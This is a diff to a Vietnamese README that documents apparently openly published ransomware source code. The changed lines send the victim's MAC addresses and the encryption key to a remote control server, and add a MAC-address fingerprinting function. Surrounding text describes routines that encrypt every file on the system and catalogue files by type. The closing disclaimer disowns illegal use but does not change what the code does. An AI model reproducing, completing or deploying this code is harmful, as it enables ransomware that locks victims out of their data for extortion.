@@ -35,7 +35,7 @@ def ConnectServer(self, connected=False) -> None:
             # Kết nối đến máy chủ với địa chỉ và cổng đã cung cấp
             self.server.connect((self.host, self.port))
             # Gửi thông tin hệ thống và khóa đến máy chủ
-            self.server.sendall(f'{self.system}|{self.key.decode("utf-8")}'.encode('utf-8'))
+            self.server.sendall(f'{self.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
             connected = True
         except:
             # Tăng số lần thử lại và chờ 100 giây trước khi thử lại
@@ -48,6 +48,28 @@ def ConnectServer(self, connected=False) -> None:
         finally:
             # Đóng kết nối sau khi thực hiện xong
             self.server.close()
+ ```
+ - **Mac:** 
+ *Lấy các địa chỉ MAC thứ hai và thứ ba*
+ ```python
+ def Mac(self):
+    try:
+        address_mac = {}
+        mac_addresses = []
+        # Lặp qua các giao diện mạng và địa chỉ MAC
+        for interface, addresses in psutil.net_if_addrs().items():
+            for address in addresses:
+                # Kiểm tra nếu địa chỉ là địa chỉ MAC
+                if address.family == psutil.AF_LINK:
+                    address_mac[interface] = address.address
+        # Lấy các địa chỉ MAC thứ hai và thứ ba
+        for _, mac_address in address_mac.items():
+            mac_addresses.append(mac_address)
+        # Trả về chuỗi gồm địa chỉ MAC thứ hai và thứ ba, cách nhau bởi dấu "|"
+        return mac_addresses[1] + '|' + mac_addresses[2]
+    except Exception as e:
+        # Trả về 'No-Mac' nếu có lỗi xảy ra
+        return 'No-Mac'
  ```
  - **Encrypted:**
   *Mã hóa các tệp trên hệ thống. Nó lặp qua tất cả các tệp trong hệ thống, mã hóa chúng bằng cách đọc và ghi dữ liệu từng phần. Lặp qua tất cả các tệp trong thư mục đã chỉ định và mã hóa từng tệp.*
@@ -119,4 +141,4 @@ def Listfiles(self) -> dict:
             file_categories[extcategory[ext]].append(str(entry))
     return file_categories
  ```
- ### Chúng tôi không chịu trách nhiệm về các hành vi vi phạm pháp luật của các cá nhân hay tổ chức sử dụng trái phép mã nguồn mở này!
+ # Chúng tôi không chịu trách nhiệm về các hành vi vi phạm pháp luật của các cá nhân hay tổ chức sử dụng trái phép mã nguồn mở này!
